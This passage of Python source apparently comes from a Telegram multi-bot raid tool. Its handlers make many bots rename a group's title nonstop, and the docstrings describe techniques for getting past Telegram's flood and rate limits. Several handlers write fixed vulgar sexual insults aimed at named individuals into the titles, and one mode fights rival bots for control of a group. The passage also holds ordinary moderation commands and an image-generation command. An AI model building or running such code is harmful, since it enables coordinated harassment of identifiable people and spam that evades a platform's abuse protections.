        f"🍆 💦𝐋𝐔𝐍𝐃𝐍𝐂 𝐇𝐘𝐏𝐄𝐑𝐅𝐈𝐑𝐄 ({len(bots)} bots)\n"
        f"🔥 Raw aggressive NC · max speed\n"
        f"Stop: /stop"
    )


_BHOSDA_SYMS = [
    "⸨","⸩","⟦","⟧","⦃","⦄","⦅","⦆","⦇","⦈",
    "𓂀","𓃰","𓆏","𓅓","𓆑","𓆈","𓅃","𓃟",
    "♠","♣","♟","⚜","🔱","⚡","💀","☠️",
    "꩜","꩜","⌬","◈","⎔","⧖","⬡","⬢","⍟",
    "🖤","🗡️","⚔️","🛡","🔪","💣","💥","☄️",
]

async def bhosdanc_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+bhosdanc", "💦bhosdanc", "/bhosdanc", "+Bhosdanc", "💦Bhosdanc"), context)
    if not base:
        return await update.message.reply_text("Usage: +Bhosdanc <text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]

    def make_name():
        s = random.choice(_BHOSDA_SYMS)
        return f"{s}{base}{s}{make_suffix()}"[:255]

    async def nc_loop(stop_event: asyncio.Event):
        await _ghost_burn_engine(chat_id, bots, stop_event, make_name)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    await update.message.reply_text(
        f"☠️ 💦𝐁𝐇𝐎𝐒𝐃𝐀𝐍𝐂 𝐆𝐇𝐎𝐒𝐓 ({len(bots)} bots)\n"
        f"🖤 Heavy ghost-burn mode · flood-proof\n"
        f"Stop: /stop"
    )


_AREY_SYMS = [
    "¿","¡","✧","˚","⊹","₊","⁎","◌","⌖","⌗",
    "꩓","꩔","꩕","꩖","ꫂ","꫁","ꫀ","꫃",
    "🫦","😏","😈","👀","💅","🤌","👁️","💬","🗣️",
    "⟨","⟩","《","》","〈","〉","「","」","【","】",
    "🎭","🎪","🎯","🃏","🎲","♟️","🎴","🀄",
]

async def areync_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+areync", "💦areync", "/areync"), context)
    if not base:
        return await update.message.reply_text("Usage: +areync <text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]
    _last = [""]

    def make_name():
        s1 = random.choice(_AREY_SYMS)
        s2 = random.choice(_AREY_SYMS)
        suf = make_suffix()
        c = f"{s1} {base} {s2}{suf}"[:255]
        if c != _last[0]:
            _last[0] = c
        return c

    async def nc_loop(stop_event: asyncio.Event):
        await _steadync_engine(chat_id, bots, stop_event, make_name, 0.0)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    await update.message.reply_text(
        f"😏 💦𝐀𝐑𝐄𝐘𝐍𝐂 𝐓𝐀𝐔𝐍𝐓 ({len(bots)} bots)\n"
        f"👀 Teasing relay NC · full flood bypass\n"
        f"Stop: /stop"
    )


_HAT_SYMS = [
    "𓂀","𓃰","𓆏","𓅓","𓆑","𓅃",
    "☠️","💀","🖤","🗡️","⚔️","🔪","⚰️","🩸","🕯️","🌑",
    "꙰","꙱","꙲","ꙴ","ꙵ","ꙶ","ꙷ","ꙸ","ꙹ","ꙺ",
    "⛧","⛥","✝","☦","☪","✡","🔯","⚠️","☢️","☣️",
    "🌒","🌓","🌔","🌑","🌘","🌙","🌚","🌫️","🌧️","⛈️",
]

async def hatnc_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+hatnc", "💦hatnc", "/hatnc"), context)
    if not base:
        return await update.message.reply_text("Usage: +hatnc <text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]
    _last = [""]

    def make_name():
        return _build_name(base, _last)

    async def nc_loop(stop_event: asyncio.Event):
        await _stealth_engine(chat_id, bots, stop_event, make_name)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    await update.message.reply_text(
        f"🖤 💦𝐇𝐀𝐓𝐍𝐂 𝐃𝐀𝐑𝐊 𝐒𝐓𝐄𝐀𝐋𝐓𝐇 ({len(bots)} bots)\n"
        f"☠️ Dark mode · micro-jitter stealth\n"
        f"Stop: /stop"
    )


_CRY_SYMS = [
    "😭","💔","🥺","🥹","😢","😞","😔","😿","🫂","🤍",
    "ꦿ","ꪆ","ꦾ","ꦽ","ꦼ","ꪊ","ꪋ","ꪌ","ꪍ",
    "꩓","꩔","꩕","꩖","ꪗ","ꪘ","ꪙ","ꪚ","ꪛ",
    "🌧️","🌨️","❄️","🌊","💧","🫧","☁️","🌫️","🌁","🌃",
    "🕊️","🪽","🌺","🌸","🌼","💮","🤍","🩶","🩷","💫",
]

async def crync_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+😭nc", "💦😭nc", "/😭nc", "+crync", "💦crync", "/crync"), context)
    if not base:
        return await update.message.reply_text("Usage: +😭nc <text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]
    _last = [""]

    def make_name():
        s1 = random.choice(_CRY_SYMS)
        s2 = random.choice(_CRY_SYMS)
        suf = make_suffix()
        c = f"😭{s1}{base}{s2}😭{suf}"[:255]
        if c != _last[0]:
            _last[0] = c
        return c

    async def nc_loop(stop_event: asyncio.Event):
        await _steadync_engine(chat_id, bots, stop_event, make_name, 0.0)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    await update.message.reply_text(
        f"😭 💦😭𝐍𝐂 𝐄𝐌𝐎 𝐌𝐎𝐃𝐄 ({len(bots)} bots)\n"
        f"💔 Crying symbols · unlimited NC\n"
        f"Stop: /stop"
    )


_PERSONAL_SYMS = [
    "꒰","꒱","꒦","꒷","ꗃ","ꖰ","꙰","ꬶ","ꬷ","꧃","꧅","꧇",
    "⌇","⟦","⟧","⸨","⸩","◈","꩜","⌬","⍟","⎔","⧖",
    "🔥","💥","⚡","☄️","💀","🖤","🗡️","⚔️","💣","🌋",
    "𓂀","𓃰","𓆏","𓅓","♠","♣","⚜","🔱",
    "꫁","ꫂ","⟡","✦","◉","✧","⊹","✶","⋆",
]

def _personal_nc_name(user_txt: str, taunt: str, last: list) -> str:
    for _ in range(20):
        s1 = random.choice(_PERSONAL_SYMS)
        s2 = random.choice(_PERSONAL_SYMS)
        suf = make_suffix()
        c = f"{s1}{user_txt} {taunt}{s2}{suf}"[:255]
        if c != last[0]:
            last[0] = c
            return c
    return f"{user_txt} {taunt}{make_suffix()}"[:255]


def _make_personal_nc_handler(cmd_names, taunt: str, label: str, engine="hyperfire"):
    """
    Factory that builds a personal NC handler.
    cmd_names  — tuple of accepted prefixes e.g. ("+burnavnc","💦burnavnc","/burnavnc")
    taunt      — fixed insult embedded in every title e.g. "burnav se chud"
    label      — display name in confirmation msg
    engine     — "hyperfire" | "ghost" | "stealth" | "steady"
    """
    async def handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.effective_user or not is_admin(update.effective_user.id):
            return
        if not update.effective_chat or not update.message:
            return
        if not _is_primary_bot(context):
            return
        raw  = (update.message.text or "").strip()
        base = _extract_base(raw, cmd_names, context)
        if not base:
            main = cmd_names[0]
            return await update.message.reply_text(f"Usage: {main} <text>")
        chat_id = update.effective_chat.id
        bots    = [b for b in all_bot_instances if b is not None] or [context.bot]
        _last   = [""]
        def make_name():
            return _personal_nc_name(base, taunt, _last)
        if engine == "hyperfire":
            async def nc_loop(stop_event: asyncio.Event):
                await _hyperfire_engine(chat_id, bots, stop_event, make_name)
        elif engine == "ghost":
            async def nc_loop(stop_event: asyncio.Event):
                await _ghost_burn_engine(chat_id, bots, stop_event, make_name)
        elif engine == "stealth":
            async def nc_loop(stop_event: asyncio.Event):
                await _stealth_engine(chat_id, bots, stop_event, make_name)
        else:
            async def nc_loop(stop_event: asyncio.Event):
                await _steadync_engine(chat_id, bots, stop_event, make_name, 0.0)
        await task_controller.start_task(chat_id, "nc", nc_loop)
        preview = make_name()
        await update.message.reply_text(
            f"💦 {label} NC 𝐀𝐂𝐓𝐈𝐕𝐄 ({len(bots)} bots)\n"
            f"📝 Preview: {preview[:80]}\n"
            f"Stop: /stop"
        )
    return handler


arnavnc_handler = _make_personal_nc_handler(
    cmd_names=("+arnavnc", "💦arnavnc", "/arnavnc"),
    taunt="༶•┈┈⛧𝑨𝑹𝑵𝑨𝑽 𝑺𝑬 𝑪𝑯𝑼𝑫┈♛",
    label="𝐀𝐑𝐍𝐀𝐕",
    engine="hyperfire",
)

kentonc_handler = _make_personal_nc_handler(
    cmd_names=("+kentonc", "💦kentonc", "/kentonc"),
    taunt="༶•┈┈𝑲𝑬𝑵𝑻𝑶 𝑺𝑬 𝑪𝑼𝑫┈♛",
    label="𝐊𝐄𝐍𝐓𝐎",
    engine="ghost",
)

cr7nc_handler = _make_personal_nc_handler(
    cmd_names=("+cr7nc", "💦cr7nc", "/cr7nc"),
    taunt="༶•┈┈⛧𝑪𝑹7 𝑲𝑨 𝑭𝑶𝑶𝑻𝑩𝑶𝑳𝑳 𝑻𝑴𝑲 𝑩𝑯𝑶𝑺𝑫𝑬 𝑴𝑬┈♛",
    label="𝐂𝐑𝟕",
    engine="stealth",
)


async def tripnc_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +tripnc <text>
    ────────────────────────────────────────────────────────────
    TRIO ROTATE NC — the smoothest, most constant NC mode.

    Bots are split into trios: [Bot1,2,3] [Bot4,5,6] [Bot7,8,9] …
    Each trio starts with a 2.5 s stagger so flood windows NEVER overlap.
    When one trio slows down near its rate limit, the next trio is already
    running at full speed. Short floods (≤8 s) are ghost-skipped.
    Result: NC looks completely constant — no visible flood gap ever.
    ────────────────────────────────────────────────────────────
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw  = (update.message.text or "").strip()
    base = _extract_base(raw, ("+tripnc", "💦tripnc", "/tripnc"), context)
    if not base:
        return await update.message.reply_text("Usage: +tripnc <text>")

    chat_id = update.effective_chat.id
    bots    = [b for b in all_bot_instances if b is not None] or [context.bot]
    _last   = [""]
    n_trios = max(1, (len(bots) + 2) // 3)

    def make_name():
        return _build_name(base, _last)

    async def nc_loop(stop_event: asyncio.Event):
        await _trio_rotate_engine(chat_id, bots, stop_event, make_name)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    await update.message.reply_text(
        f"🔄 💦𝐓𝐑𝐈𝐏𝐍𝐂 𝐀𝐂𝐓𝐈𝐕𝐄 ({len(bots)} bots · {n_trios} trios)\n"
        f"⚡ Staggered flood windows → seamless constant NC\n"
        f"🛡 Short floods ghost-skipped · Rate limit pre-empted\n"
        f"Stop: /stop"
    )


async def ultranc_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +ultranc <text>
    ════════════════════════════════════════════════════════════
    ULTRA NC — Combines every flood bypass technique:

    ⚡ Fire-and-forget pipeline (no wait between renames)
    🔄 Trio stagger (1.5 s) — flood windows never overlap
    👻 Ghost mode — floods ≤ 20 s skipped (10-40 ms jitter)
    🛡  Pre-emptive guard at 12 renames/min before hard limit
    🎨 4 rotating name templates — every rename looks unique
       (3 symbol pools × 4 templates = insane variety)

    10 bots split into 4 trios. Each trio fires independently.
    At any moment, 6-9 bots are naming at full speed.
    Flood laga hi nahi — ya laga to kisi ne notice nahi kiya.
    ════════════════════════════════════════════════════════════
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw  = (update.message.text or "").strip()
    base = _extract_base(raw, ("+ultranc", "💦ultranc", "/ultranc"), context)
    if not base:
        return await update.message.reply_text("Usage: +ultranc <text>")

    chat_id = update.effective_chat.id
    bots    = [b for b in all_bot_instances if b is not None] or [context.bot]
    _last   = [""]
    n_trios = max(1, (len(bots) + 2) // 3)

    def make_name():
        return _ultra_name(base, _last)

    async def nc_loop(stop_event: asyncio.Event):
        await _ultra_engine(chat_id, bots, stop_event, make_name)

    await task_controller.start_task(chat_id, "nc", nc_loop)
    await update.message.reply_text(
        f"⚡ 💦𝐔ʟᴛʀᴀ 𝐍ᴄ 𝐀ᴄᴛɪᴠᴇ ({len(bots)} bots · {n_trios} trios)\n"
        f"🔥 Fɪʀᴇ - Aɴᴅ - Fᴏʀɢᴇᴛ  Pɪᴘᴇʟɪɴᴇ Eɴᴀʙʟᴇᴅ\n"
        f"👻 Gʜᴏsᴛ Mᴏᴅᴇ : Fʟᴏᴏᴅs ≤20s Aʀᴇ Sᴋɪᴘᴘᴇᴅ\n"
        f"🛡 Rᴀᴛᴇ Gᴜᴀʀᴅ : Pᴇʀ - Eᴍᴘᴛɪᴠᴇ Sʟᴏᴡ Aᴛ 12/Mɪɴ\n"
        f"🎨 4 Tᴇᴍᴘʟᴀᴛᴇ Rᴏᴛᴀᴛɪᴏɴ — Iɴғɪɴɪᴛᴇ Vᴀʀɪᴇᴛʏ\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Sᴛᴏᴘ : /stop"
    )


_INFERNO_SYMS  = ["🔥","🌋","💥","☄️","🌩️","🌪️","💣","🧨","♨️","🌡️","🔴","🟠","🫦","🫀","❤️‍🔥"]
_VOID_SYMS     = ["🌑","🖤","☠️","💀","🌚","🌘","👁️","🕳️","🌫️","🩸","⚫","🕷️","🕸️","🦇","🌒"]
_STORM_SYMS    = ["⚡","🌩️","🌪️","🌊","🌀","🌧️","❄️","🌨️","🌬️","🌫️","💨","🌈","🌤️","⛈️","🌦️"]
_BLOOD_SYMS    = ["🩸","💀","🗡️","⚔️","🔪","🩻","🦴","💔","❤️‍🩹","🫀","☠️","🔴","🩺","🩹","🧬"]
_DIVINE_SYMS   = ["👑","⚜","🔱","✨","💎","🌟","⭐","🌠","🏆","🪙","🌙","☀️","🌞","🌺","🕊️"]

def _make_blitz_nc_handler(cmd_names: tuple, sym_pool: list, label: str, template: int = 0):
    """
    𝐅ᴀᴄᴛᴏʀʏ → 𝐂ʀᴇᴀᴛs ᴀ 𝐍ᴄ 𝐇ᴀɴᴅʟᴇʀ 𝐔sɪɴɢ 𝐓ʜᴇ 𝐁ʟɪᴛᴢ 𝐄ɴɢɪɴᴇ.
    template 0: {e1}{text}{e2}{suf}
    template 1: {e1}{e2}{text}{suf}
    template 2: {text}{e1}{e2}{suf}
    template 3: {e1}{e2}{text}{e1}{suf}
    """
    async def handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.effective_user or not is_admin(update.effective_user.id):
            return
        if not update.effective_chat or not update.message:
            return
        if not _is_primary_bot(context):
            return
        raw  = (update.message.text or "").strip()
        base = _extract_base(raw, cmd_names, context)
        if not base:
            return await update.message.reply_text(f"Usage: {cmd_names[0]} <text>")
        chat_id = update.effective_chat.id
        bots    = [b for b in all_bot_instances if b is not None] or [context.bot]
        _last   = [""]
        def make_name():
            e1 = random.choice(sym_pool)
            e2 = random.choice(sym_pool)
            sf = make_suffix()
            if template == 0:
                c = f"{e1}{base}{e2}{sf}"
            elif template == 1:
                c = f"{e1}{e2}{base}{sf}"
            elif template == 2:
                c = f"{base}{e1}{e2}{sf}"
            else:
                c = f"{e1}{e2}{base}{e1}{sf}"
            c = c[:255]
            if c != _last[0]:
                _last[0] = c
            return c
        async def nc_loop(stop_event: asyncio.Event):
            await _blitz_engine(chat_id, bots, stop_event, make_name)
        await task_controller.start_task(chat_id, "nc", nc_loop)
        await update.message.reply_text(
            f"⚡ 💦{label} 𝐁ʟɪᴛᴢ 𝐀ᴄᴛɪᴠᴇ ({len(bots)} bots)\n"
            f"🔥 2 Pᴀʀᴀʟʟᴇʟ Rᴇɴᴀᴍᴇs /bot ● Gʜᴏsᴛ 25s ● Nᴏ Sᴛᴀɢɢᴇʀ\nStop: /stop"
        )
    return handler


infernc_handler = _make_blitz_nc_handler(
    ("+infernc",  "💦infernc",  "/infernc"),  _INFERNO_SYMS, "🔥 𝐈ɴғᴇʀ 𝐍ᴄ", template=0)
voidnc_handler  = _make_blitz_nc_handler(
    ("+voidnc",   "💦voidnc",   "/voidnc"),   _VOID_SYMS,   "🌑 𝐕ᴏɪᴅ 𝐍ᴄ",  template=1)
stormnc_handler = _make_blitz_nc_handler(
    ("+stormnc",  "💦stormnc",  "/stormnc"),  _STORM_SYMS,  "⚡𝐒ᴛʀᴏᴍ 𝐍ᴄ", template=2)
bloodnc_handler = _make_blitz_nc_handler(
    ("+bloodnc",  "💦bloodnc",  "/bloodnc"),  _BLOOD_SYMS,  "🩸𝐁ʟᴏᴏᴅ 𝐍ᴄ", template=3)
divinenc_handler= _make_blitz_nc_handler(
    ("+divinenc", "💦divinenc", "/divinenc"), _DIVINE_SYMS, "👑 𝐃ᴇᴠɪɴᴇ 𝐍ᴄ",template=0)


_Godx_TXT  = "𝑫𝑶𝑮"

_Godx_POOLS = [
    ["🔥","💥","🌋","☄️","🔴","🟠"],
    ["⚡","🌩️","💫","✨","🌟","🌠"],
    ["💀","☠️","🌑","🖤","🕷️","🦇"],
    ["🌊","💧","🌀","🫧","🐚","🔵"],
    ["👑","⚜","🔱","💎","🏆","🌟"],
    ["🐉","🐍","🌋","🔱","⚡","🌀"],
    ["🩸","🗡️","⚔️","🔪","💔","☠️"],
    ["💎","🔷","🔹","💠","🌐","✨"],
    ["🌑","🌘","🌒","🌙","⭐","🌌"],
    ["⚡","🔱","👑","🌋","💥","🌟"],
]

_Godx_TEMPLATES = [
    lambda e1,e2,t,s: f"{e1}{_Godx_TXT}{t}{e2}{s}",
    lambda e1,e2,t,s: f"{e1}{_Godx_TXT}{t}{e2}{s}",
    lambda e1,e2,t,s: f"{e1}{_Godx_TXT}{e2}{t}{s}",
    lambda e1,e2,t,s: f"{e1}{e2}{t}{_Godx_TXT}{s}",
    lambda e1,e2,t,s: f"{t}{_Godx_TXT}{e1}{e2}{s}",
    lambda e1,e2,t,s: f"{e1}{t}{_Godx_TXT}{e2}{s}",
    lambda e1,e2,t,s: f"{_Godx_TXT}{e1}{t}{e2}{s}",
    lambda e1,e2,t,s: f"{e2}{_Godx_TXT}{e1}{t}{s}",
    lambda e1,e2,t,s: f"{e1}{t}{_Godx_TXT}{e2}{s}",
    lambda e1,e2,t,s: f"{e1}{_Godx_TXT}{t}{e2}{s}",
]

def _make_godx_nc_handler(num: int, emoji_pool: list):
    cmd_names = (f"+Godx{num}", f"💦Godx{num}", f"/Godx{num}")
    tmpl      = _Godx_TEMPLATES[(num - 1) % len(_Godx_TEMPLATES)]
    label     = f"Rexxy - X{num}"

    async def handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.effective_user or not is_admin(update.effective_user.id):
            return
        if not update.effective_chat or not update.message:
            return
        if not _is_primary_bot(context):
            return
        raw  = (update.message.text or "").strip()
        base = _extract_base(raw, cmd_names, context)
        if not base:
            return await update.message.reply_text(f"Usage: {cmd_names[0]} <text>")
        chat_id = update.effective_chat.id
        bots    = [b for b in all_bot_instances if b is not None] or [context.bot]
        _last   = [""]
        def make_name():
            e1 = random.choice(emoji_pool)
            e2 = random.choice(emoji_pool)
            sf = make_suffix()
            c  = tmpl(e1, e2, base, sf)[:255]
            if c == _last[0]:
                c = tmpl(random.choice(emoji_pool), random.choice(emoji_pool), base, make_suffix())[:255]
            _last[0] = c
            return c
        async def nc_loop(stop_event: asyncio.Event):
            await _Godx_hyperblitz_engine(chat_id, bots, stop_event, make_name)
        await task_controller.start_task(chat_id, "nc", nc_loop)
        e_preview = random.choice(emoji_pool)
        await update.message.reply_text(
            f"👿 {label} 𝐇ʏᴘᴇʀʙʟɪᴛᴢ 𝐀ᴄᴛɪᴏɴ ({len(bots)} bots)\n"
            f"{e_preview} 4x Cᴏɴᴄᴜʀʀᴇɴᴛ ● Gʜᴏsᴛ Fʟᴏᴏᴅs (≤99s) Sᴋɪᴘᴘᴇᴅ · Nᴏ Lᴏɴɢ Pᴀᴜsᴇs\n"
            f"𝐒ᴛᴏᴘ : /stop"
        )
    return handler

Godx1_handler  = _make_godx_nc_handler(1,  _Godx_POOLS[0])
Godx2_handler  = _make_godx_nc_handler(2,  _Godx_POOLS[1])
Godx3_handler  = _make_godx_nc_handler(3,  _Godx_POOLS[2])
Godx4_handler  = _make_godx_nc_handler(4,  _Godx_POOLS[3])
Godx5_handler  = _make_godx_nc_handler(5,  _Godx_POOLS[4])
Godx6_handler  = _make_godx_nc_handler(6,  _Godx_POOLS[5])
Godx7_handler  = _make_godx_nc_handler(7,  _Godx_POOLS[6])
Godx8_handler  = _make_godx_nc_handler(8,  _Godx_POOLS[7])
Godx9_handler  = _make_godx_nc_handler(9,  _Godx_POOLS[8])
Godx10_handler = _make_godx_nc_handler(10, _Godx_POOLS[9])


_POLLINATIONS_URL = (
    "https://image.pollinations.ai/prompt/{prompt}"
    "?width=1024&height=1024&model=flux&nologo=true&enhance=true"
)

def _download_image_sync(prompt: str) -> bytes:
    encoded = urllib.parse.quote(prompt, safe="")
    url = _POLLINATIONS_URL.format(prompt=encoded)
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=60) as r:
        return r.read()

async def aiimg_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +aiimg <prompt>  or  /aiimg <prompt>
    Generates an AI image using Pollinations.ai (free, no API key needed).
    Sends the image directly to the current chat.

    Examples:
      +aiimg anime girl with blue hair
      +aiimg dark warrior in rain cinematic
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    prompt = _extract_base(raw, ("+aiimg", "💦aiimg", "/aiimg"), context)
    if not prompt:
        return await update.message.reply_text(
            "Usage: +aiimg <prompt>\n"
            "Example: +aiimg anime girl with blue hair glowing eyes"
        )

    wait_msg = await update.message.reply_text(
        f"🎨 Generating AI image…\n"
        f"📝 Prompt: {prompt[:80]}"
    )
    loop = asyncio.get_event_loop()
    try:
        img_bytes = await asyncio.wait_for(
            loop.run_in_executor(None, _download_image_sync, prompt),
            timeout=70,
        )
    except asyncio.TimeoutError:
        await wait_msg.edit_text("❌ Generation timed out. Try a simpler prompt.")
        return
    except Exception as e:
        await wait_msg.edit_text(f"❌ Failed: {e}")
        return

    img_file = io.BytesIO(img_bytes)
    img_file.name = "ai_image.jpg"
    bot = all_bot_instances[0] if all_bot_instances else context.bot
    try:
        await bot.send_photo(
            chat_id=update.effective_chat.id,
            photo=img_file,
            caption=(
                f"🎨 *AI Image*\n"
                f"📝 {prompt[:120]}\n\n"
                f"💦 𝘣𝘺 𝐒𝐚𝐬𝐮𝐤𝐞 ⚡"
            ),
            parse_mode="Markdown",
        )
        await wait_msg.delete()
    except Exception as e:
        await wait_msg.edit_text(f"❌ Failed to send image: {e}")


async def leave_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /leave — Makes ALL bots leave the current group chat.
    Primary bot sends confirmation before leaving.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]

    try:
        await update.message.reply_text(
            f"💦 𝐋𝐄𝐀𝐕𝐈𝐍𝐆 𝐆𝐂 ({len(bots)} bots)\n"
            f"Bye bye 💦🌊"
        )
    except Exception:
        pass

    await asyncio.sleep(0.5)

    await task_controller.stop_all_for_chat(chat_id)
    known_chats.discard(chat_id)
    save_groups(known_chats)

    async def _leave_one(bot):
        try:
            await bot.leave_chat(chat_id)
        except Exception:
            pass

    await asyncio.gather(*[_leave_one(bot) for bot in bots], return_exceptions=True)


async def mute_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /mute — Toggle: when ON, every message from non-admins is deleted immediately.
    The bot must have delete_messages permission.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return

    chat_id = update.effective_chat.id
    if chat_id in mute_chats:
        mute_chats.discard(chat_id)
        await update.message.reply_text("🔊 💦 𝐌𝐔𝐓𝐄 𝐎𝐅𝐅 — Messages flowing again")
    else:
        mute_chats.add(chat_id)
        await update.message.reply_text(
            "🔇 💦 𝐌𝐔𝐓𝐄 𝐎𝐍 — All incoming msgs will be deleted\n"
            "Run /mute again to turn off"
        )


async def ncdel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /ncdel — TOGGLE.
    When ON: every NEW_CHAT_TITLE service message from a non-admin user
    is immediately deleted. So if an enemy bot/user tries to NC (change
    the group title), their service message ("X changed group name to Y")
    is wiped instantly — making their NC invisible.
    Bot needs delete_messages admin right.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return

    chat_id = update.effective_chat.id
    if chat_id in ncdel_chats:
        ncdel_chats.discard(chat_id)
        await update.message.reply_text(
            "🟢 💦 𝐍𝐂𝐃𝐄𝐋 𝐎𝐅𝐅 — Enemy NC msgs will no longer be deleted"
        )
    else:
        ncdel_chats.add(chat_id)
        await update.message.reply_text(
            "🗑 💦 𝐍𝐂𝐃𝐄𝐋 𝐎𝐍 — Every enemy NC service msg will be deleted instantly\n"
            "Run /ncdel again to turn off"
        )


async def ncwar_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /ncwar <text>
    Starts hyperfire NC with our text AND listens for title changes:
    the moment an enemy changes the title, all bots immediately override it back.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("/ncwar", "+ncwar", "💦ncwar"), context)
    if not base:
        return await update.message.reply_text("Usage: /ncwar <your text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]

    ncwar_targets[chat_id] = base
    _last = [""]

    def make_name():
        return _build_name(base, _last)

    async def nc_loop(stop_event: asyncio.Event):
        await _hyperfire_engine(chat_id, bots, stop_event, make_name)

    await task_controller.start_task(chat_id, "ncwar", nc_loop)
    await update.message.reply_text(
        f"⚔️ 💦𝐍𝐂𝐖𝐀𝐑 𝐀𝐂𝐓𝐈𝐕𝐄 ({len(bots)} bots)\n"
        f"🛡️ Overriding enemy NC with: {base[:40]}\n"
        f"⚡ Hyperfire + instant title-change revert\n"
        f"Stop: /stopncwar"
    )


async def stopncwar_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_chat or not update.message:
        return
    chat_id = update.effective_chat.id
    ncwar_targets.pop(chat_id, None)
    stopped = await task_controller.stop_task(chat_id, "ncwar")
    if stopped:
        await update.message.reply_text("🛑 💦 𝐍𝐂𝐖𝐀𝐑 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")
    else:
        await update.message.reply_text("No ncwar running here.")


async def gclist_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /gclist — Lists all group chat IDs the bot has seen.
    Also tries to fetch the current title for each group.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.message:
        return

    if not known_chats:
        return await update.message.reply_text("💦 No groups known yet.")

    lines = [f"💦 𝐊𝐍𝐎𝐖𝐍 𝐆𝐂𝐒 ({len(known_chats)})\n"]
    bot = context.bot
    for cid in list(known_chats):
        try:
            chat = await bot.get_chat(cid)
            title = chat.title or "—"
        except Exception:
            title = "?"
        status_icons = []
        if cid in mute_chats:
            status_icons.append("🔇")
        if cid in ncdel_chats:
            status_icons.append("🗑")
        if cid in ncwar_targets:
            status_icons.append("⚔️")
        if cid in autoreact_chats:
            status_icons.append("😂")
        icons = " ".join(status_icons)
        lines.append(f"• {title[:35]} {icons}\n  ID: {cid}")

    await update.message.reply_text("\n".join(lines))


_NO_PERMS = ChatPermissions(
    can_send_messages=False,
    can_send_audios=False,
    can_send_documents=False,
    can_send_photos=False,
    can_send_videos=False,
    can_send_video_notes=False,
    can_send_voice_notes=False,
    can_send_polls=False,
    can_send_other_messages=False,
    can_add_web_page_previews=False,
    can_change_info=False,
    can_invite_users=False,
    can_pin_messages=False,
)
_ALL_PERMS = ChatPermissions(
    can_send_messages=True,
    can_send_audios=True,
    can_send_documents=True,
    can_send_photos=True,
    can_send_videos=True,
    can_send_video_notes=True,
    can_send_voice_notes=True,
    can_send_polls=True,
    can_send_other_messages=True,
    can_add_web_page_previews=True,
    can_change_info=False,
    can_invite_users=True,
    can_pin_messages=False,
)


async def restrict_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /restrict — Reply to a user's message → restrict all their permissions.
    Bot must be admin with restrict_members right.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return

    target = None
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        target = update.message.reply_to_message.from_user
    elif context.args:
        try:
            target_id = int(context.args[0])
        except ValueError:
            return await update.message.reply_text("Usage: /restrict (reply to user)")
        try:
            target = await context.bot.get_chat_member(update.effective_chat.id, target_id)
            target = target.user
        except Exception:
            return await update.message.reply_text("❌ Could not find that user.")

    if not target:
